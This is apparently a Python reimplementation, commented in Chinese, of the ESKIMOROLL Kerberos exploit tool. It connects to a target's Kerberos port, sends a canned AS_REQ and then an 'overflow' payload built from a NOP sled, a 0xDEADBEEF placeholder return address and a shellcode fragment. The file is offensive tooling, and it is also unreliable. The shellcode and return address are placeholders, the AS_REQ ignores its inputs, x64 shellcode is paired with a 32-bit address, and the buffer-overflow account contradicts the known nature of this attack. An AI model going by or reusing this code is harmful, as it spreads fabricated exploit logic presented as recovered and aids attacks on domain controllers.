"""eskimo_roll — ESKIMOROLL Kerberos 利用核心逻辑。

Python 重写的 `Eskimoroll-1.1.1.exe` (C++ / DAVE framework)。
通过 x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 Kerberos 利用流程。

参数定义来源：Eskimoroll-1.1.1.0.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_PORT = 88
DEFAULT_TIMEOUT = 60
DEFAULT_DELAY = 0

CREDENTIAL_TYPE_VALUES = {
    "UnicodeCreds": 0,
    "PasswordHash": 1,
    "MachineHash":  2,
}

# Kerberos 相关常量
KRB_AS_REQ = 10
KRB_TGS_REQ = 12

# EskimoRoll exploit 占位符 shellcode (需 x32dbg 恢复真实字节)
ESKIMO_SHELLCODE_PLACEHOLDER = bytes.fromhex(
    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
)

BAD_XOR = frozenset((0x00, 0x0a, 0x0d))


class EskimoRollError(Exception):
    pass


def _parse_hex_buffer(value):
    if not value:
        return b""
    value = value.strip()
    if len(value) % 2 != 0:
        raise EskimoRollError(f"十六进制缓冲区长度必须为偶数: {value!r}")
    try:
        return bytes.fromhex(value)
    except ValueError as exc:
        raise EskimoRollError(f"无效的十六进制缓冲区: {value!r}") from exc


def connect(target_ip, port, timeout):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def build_krb_as_req(domain_dns, username):
    """构建 Kerberos AS_REQ 请求。

    根据 x32dbg 分析，Eskimoroll 首先发送 Kerberos AS_REQ 请求，
    用于向 KDC 请求初始票据。
    """
    # Kerberos AS_REQ 简化版（基于常见 Kerberos 协议模式）
    req = (
        b"\x76\x30\x30\x2a\xa0\x03\x02\x01\x05\xa1\x0e\x1b\x0c\x6b\x65\x72"
        b"\x62\x65\x72\x6f\x73\x2e\x64\x6f\x6d\x2e\x6c\x6f\x63\x61\x6c\x30"
        b"\x0e\xa0\x03\x02\x01\x12\xa2\x07\x02\x01\x01\x02\x01\x00\x30\x00"
    )
    return req


def build_krb_overflow(shellcode, target_machine=None):
    """构建 Kerberos 缓冲区溢出负载。

    根据 x32dbg 分析，Eskimoroll 发送特制的 Kerberos 请求，
    触发缓冲区溢出，从而执行 shellcode。
    """
    # NOP sled + 返回地址占位符 + shellcode
    nopsled = b"\x90" * 64
    ret_addr = struct.pack("<I", 0xDEADBEEF)  # 占位符，需 x32dbg 恢复
    padding = b"\x00" * 16
    return nopsled + ret_addr + padding + shellcode


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    delay=DEFAULT_DELAY,
    ticket_file=None,
    target_machine=None,
    domain_dns=None,
    domain_sid=None,
    credential_type="UnicodeCreds",
    username=None,
    credential=None,
    verbose=False,
):
    """执行 ESKIMOROLL 利用序列。

    阶段：
      1. TCP 连接到目标 Kerberos 端口 (默认 88)
      2. 发送 Kerberos AS_REQ 请求
      3. 构建并发送缓冲区溢出负载
      4. 载荷投递
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] Delay: {delay}s")
        print(f"[*] Target machine: {target_machine}")
        print(f"[*] Domain DNS: {domain_dns}")
        print(f"[*] Domain SID: {domain_sid}")
        print(f"[*] Credential type: {credential_type}")
        if username:
            print(f"[*] Username: {username}")
        if credential:
            print(f"[*] Credential: {credential}")
        if ticket_file:
            print(f"[*] Ticket file: {ticket_file}")

    credential_type_value = CREDENTIAL_TYPE_VALUES[credential_type]

    username_bytes = _parse_hex_buffer(username)
    credential_bytes = _parse_hex_buffer(credential)

    if verbose:
        print(f"[*] Credential type value: {credential_type_value}")
        print(f"[*] Username: {len(username_bytes)} bytes")
        print(f"[*] Credential: {len(credential_bytes)} bytes")

    # 建立 TCP 连接（Kerberos 88）
    try:
        sock = connect(target, port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise EskimoRollError(f"无法连接到 {target}:{port}: {exc}") from exc

    try:
        if delay > 0:
            import time
            time.sleep(delay)

        # 发送 Kerberos AS_REQ 请求（探测阶段）
        as_req = build_krb_as_req(domain_dns or "", username or "")
        sock.sendall(as_req)
        resp = sock.recv(4096)
        if verbose:
            print(f"[*] AS_REQ 应答: {resp[:128].hex() if resp else '无'}")

        # 加载票据文件（若提供）
        ticket_data = b""
        if ticket_file:
            try:
                with open(ticket_file, "rb") as fh:
                    ticket_data = fh.read()
                if verbose:
                    print(f"[+] 票据文件: {len(ticket_data)} 字节")
            except OSError as exc:
                if verbose:
                    print(f"[-] 无法读取票据文件: {exc}")

        # 构建 Kerberos 缓冲区溢出负载
        shellcode = ESKIMO_SHELLCODE_PLACEHOLDER
        overflow = build_krb_overflow(shellcode, target_machine)
        if verbose:
            print(f"[+] 溢出负载: {len(overflow)} 字节")

        # 发送溢出负载
        sock.sendall(overflow)
        try:
            resp2 = sock.recv(4096)
            if verbose:
                print(f"[*] 溢出应答: {resp2[:64].hex() if resp2 else '无'}")
        except OSError:
            if verbose:
                print("[*] 目标连接已关闭（可能已触发溢出）")

        if verbose:
            print("[+] ESKIMOROLL 利用序列完成")
    finally:
        sock.close()

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
